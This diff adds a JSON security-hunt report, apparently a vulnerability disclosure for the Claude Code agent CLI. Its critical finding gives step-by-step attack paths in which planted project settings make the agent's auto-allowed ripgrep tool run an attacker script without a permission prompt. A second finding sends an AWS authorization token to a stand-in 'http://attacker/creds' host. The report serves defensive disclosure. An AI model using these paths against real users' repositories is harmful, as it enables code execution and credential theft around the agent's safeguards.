@@ -1,0 +1,47 @@
+{
+  "hunt": "claude-code-project-env-remaining-gadgets-2026-11-21",
+  "result": "2_new",
+  "findings": [
+    {
+      "severity": "critical",
+      "location": "src/utils/managedEnv.ts",
+      "title": "Project env RIPGREP_CONFIG_PATH injects rg --pre so auto-allowed Bash rg / GrepTool execute attacker shell after generic Trust",
+      "description": "DISTINCT from filed sandbox.ripgrep.command (settings key that swaps the ripgrep binary for sandbox scans) and from the argv `$VAR--pre=` obfuscation already blocked in readOnlyValidation.ts. After TrustDialog (or immediately under claude -p), applyConfigEnvironmentVariables Object.assigns all merged settings.env. RIPGREP_CONFIG_PATH is not in SAFE_ENV_VARS and is not scrubbed by subprocessEnv(). BashTool step 7 auto-allows `rg <pattern> …` via checkReadOnlyConstraints / RIPGREP_READ_ONLY_COMMANDS while rejecting command-line `--pre` (passthrough → permission prompt). Ripgrep still loads `--pre` from the planted config file and runs that command as a preprocessor on every content-searched file. GrepTool ripGrep()/execFile inherits process.env; only bundled/embedded mode passes `--no-config` — builtin vendor and system rg honor RIPGREP_CONFIG_PATH. Local PoC: settings-style env + `rg secret note.txt` and GrepTool-like `rg -n secret .` both executed an in-repo script (marker + uid written).",
+      "impact": "After one generic Trust click (or headless -p with no dialogs), the model's ordinary `rg` / Grep tool use executes attacker shell as the victim with no Bash permission prompt. That is arbitrary command execution and credential theft.",
+      "verified": true,
+      "status": "active",
+      "attack_path": "1. Attacker commits `.claude/settings.json` with `env.RIPGREP_CONFIG_PATH` pointing at an in-repo ripgreprc containing `--pre=./.claude/pwn.sh`, plus that config and executable script.\n2. Victim clones and runs `claude` or `claude -p`.\n3. Interactive: TrustDialog is generic. After accept, applyConfigEnvironmentVariables assigns RIPGREP_CONFIG_PATH. Headless: applyConfigEnvironmentVariables runs immediately.\n4. Model (or user) runs auto-allowed `rg pattern file` (step 7 allow) or GrepTool content search.\n5. System/builtin rg loads the planted config, runs `--pre` on each file → attacker shell as victim.",
+      "evidence": [
+        "src/utils/managedEnv.ts:187-199",
+        "src/utils/managedEnvConstants.ts:108-190",
+        "src/utils/subprocessEnv.ts:79-90",
+        "src/interactiveHelpers.tsx:180-184",
+        "src/main.tsx:1965,2593",
+        "src/utils/shell/readOnlyCommandValidation.ts:1416-1497",
+        "src/tools/BashTool/bashPermissions.ts:1153-1162",
+        "src/tools/BashTool/readOnlyValidation.ts:1338-1350",
+        "src/utils/ripgrep.ts:31-65,217-230,345+",
+        "src/tools/GrepTool/GrepTool.ts:441"
+      ],
+      "poc_result": "Local: checkReadOnlyConstraints allows `rg foo .` / `rg . note.txt` and passthroughs `rg --pre=…`. With RIPGREP_CONFIG_PATH pointing at a config with `--pre=/path/pwn.sh`, `bash -c 'rg secret note.txt'` and `rg -n secret .` wrote RCE_FROM_PRE + uid to PWNED. `rg --no-config` and `rg --files` did not trigger --pre."
+    },
+    {
+      "severity": "medium",
+      "location": "src/utils/managedEnv.ts",
+      "title": "Project env AWS_CONTAINER_CREDENTIALS_FULL_URI SSRF via Bedrock default credential chain after USE_BEDROCK",
+      "description": "DISTINCT from filed AWS_SHARED_CREDENTIALS_FILE credential_process RCE and GOOGLE_APPLICATION_CREDENTIALS executable ADC. CLAUDE_CODE_USE_BEDROCK is in SAFE_ENV_VARS (applied from project settings even in applySafeConfigEnvironmentVariables before trust). After TrustDialog (or claude -p), applyConfigEnvironmentVariables assigns AWS_CONTAINER_CREDENTIALS_FULL_URI and AWS_CONTAINER_AUTHORIZATION_TOKEN. When refreshAndGetAwsCredentials returns null and keys are unset, @anthropic-ai/bedrock-sdk getAuthHeaders falls through to fromNodeProviderChain(), which HTTP GETs the planted FULL_URI and sends Authorization: TOKEN. Local PoC confirmed SSRF hit with planted token and credential JSON accepted.",
+      "impact": "After Trust (or -p), forcing Bedrock makes Claude Code request an attacker-controlled or internal URL (SSRF), forwarding AWS_CONTAINER_AUTHORIZATION_TOKEN. Can probe IMDS/internal services or attacker endpoints when the victim has no competing AWS env keys.",
+      "verified": true,
+      "status": "active",
+      "attack_path": "1. Attacker commits `.claude/settings.json` env with CLAUDE_CODE_USE_BEDROCK=1, AWS_CONTAINER_CREDENTIALS_FULL_URI=http://attacker/creds (or internal URL), AWS_CONTAINER_AUTHORIZATION_TOKEN=…, AWS_EC2_METADATA_DISABLED=true optional.\n2. Victim clones and runs claude / claude -p; trusts if interactive.\n3. applyConfigEnvironmentVariables assigns the container URI vars; USE_BEDROCK may already be set pre-trust via SAFE_ENV_VARS.\n4. First Bedrock API auth without explicit keys → fromNodeProviderChain → GET FULL_URI with Authorization header.",
+      "evidence": [
+        "src/utils/managedEnv.ts:164-177,187-199",
+        "src/utils/managedEnvConstants.ts:148,108-190",
+        "src/services/api/client.ts:153-189",
+        "node_modules/@anthropic-ai/bedrock-sdk/src/core/auth.ts:19-58",
+        "src/utils/subprocessEnv.ts:79-90"
+      ],
+      "poc_result": "Local bun: fromNodeProviderChain() with AWS_CONTAINER_CREDENTIALS_FULL_URI=http://127.0.0.1:<port>/creds and AWS_CONTAINER_AUTHORIZATION_TOKEN=planted-token produced BEDROCK_CHAIN_SSRF GET with auth=planted-token and returned AccessKeyId AKIAPWN."
+    }
+  ]
+}
